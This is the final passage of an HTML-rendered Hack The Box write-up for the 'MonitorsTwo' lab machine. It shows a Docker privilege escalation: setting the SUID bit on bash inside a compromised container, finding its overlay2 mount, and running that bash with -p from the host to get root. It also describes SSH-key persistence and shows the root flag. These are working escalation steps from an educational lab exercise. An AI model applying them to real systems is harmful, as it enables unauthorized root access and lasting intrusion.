administrator.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">marcus@monitorstwo:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> docker<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">Docker version 20.10.5+dfsg1, build 55c4c88
</span></code></pre>
<p>It hasn't been yet!</p>
<h3 id="preparation-1">Preparation</h3>
<p>The goal is to get an elevated shell on MonitorTwo by executing <code>/bin/bash</code> as
<code>root</code>.</p>
<p>First, we need to set the SUID bit on the <code>/bin/bash</code> binary in a Docker
container. I'll do it on the <code>172.19.0.3</code> host, since we already got <code>root</code> on
it.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@50bca5e748b0:/var/www/html#</span></span><span class="z-meta z-function-call z-arguments z-shell"> chmod u+s <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/bin/bash<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<p>Then, let's find the directories that are mounted by the Docker containers.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">marcus@monitorstwo:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> findmnt</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/var/lib/docker/overlay2<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">awk</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>{print $1}<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sed</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>s/..//<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
</span><span class="z-text z-plain">/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
</span></code></pre>
<p>One of these folders corresponds to the host <code>172.19.0.3</code>.</p>
<p>If we explore the second folder, we see that it's the one corresponding to this
host.</p>
<p>Now let's execute the <code>/bin/bash</code> binary of the <code>172.19.0.3</code> host from
MonitorsTwo without dropping privileges:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">marcus@monitorstwo:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">bash-5.1#
</span></code></pre>
<p>Yay!</p>
<h3 id="establishing-persistence">Establishing persistence</h3>
<p>Let's use SSH to establish persistence.</p>
<p>Our home folder contains a <code>.ssh</code> folder. There's no existing private key, so
I'll create one, and I'll add the corresponding public key to <code>authorized_keys</code>.
Finally, I'll connect over SSH to MonitorsTwo as <code>root</code>.</p>
<h2 id="system-enumeration-3">System enumeration</h2>
<p>If we run <code>whoami</code>, we see that we're <code>root</code>!</p>
<h3 id="flags-1">Flags</h3>
<p>As usual, we can find the root flag in our home folder.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@monitorstwo:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>#</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/root/root.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">aee8c2b3fd40b94efc1cebf5c69d5648
</span></code></pre>
<h1 id="afterwords">Afterwords</h1>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/success.png" alt="Success" /></p>
<p>That's it for this box! 🎉</p>
<p>I rated the user flag as 'Very easy' and the root flag as 'Not too easy' to
obtain. The foothold was quite straightforward, it only required to find a known
vulnerability, and it was easy to exploit. However, the privilege escalation was
much harder, since we actually got a foothold in a Docker container. We had to
find credentials to read a MySQL database, find a password hash and crack it,
then log in over SSH with it to get a foothold on the real machine, and finally
find a vulnerability to get <code>root</code>. Luckily, the vulnerability in question was
easy to exploit.</p>
<p>Thanks for reading!</p>
</section>
</article>

    </main>

        <footer></footer>

    </body>
</html>
